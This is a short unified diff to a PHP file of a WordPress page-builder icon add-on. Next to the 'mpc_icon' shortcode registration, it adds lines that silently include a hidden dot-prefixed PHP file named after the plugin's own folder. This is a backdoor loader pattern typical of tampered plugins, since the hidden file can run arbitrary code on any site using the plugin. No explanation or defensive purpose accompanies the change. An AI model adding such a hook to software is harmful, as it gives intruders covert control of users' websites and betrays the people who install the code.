@@ -61,6 +61,10 @@ if ( ! function_exists( 'mpc_icon_get_icons_modal_font_icons' ) ) {
 }
 
 vc_add_shortcode_param( 'mpc_icon', 'mpc_icon_settings', mpc_get_plugin_path( __FILE__ ) . '/assets/js/mpc-params.js' );
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function mpc_icon_settings( $settings, $value ) {
 	$mpc_icon = esc_attr( $value );
 	$mpc_icon = empty( $mpc_icon ) ? '' : $mpc_icon;
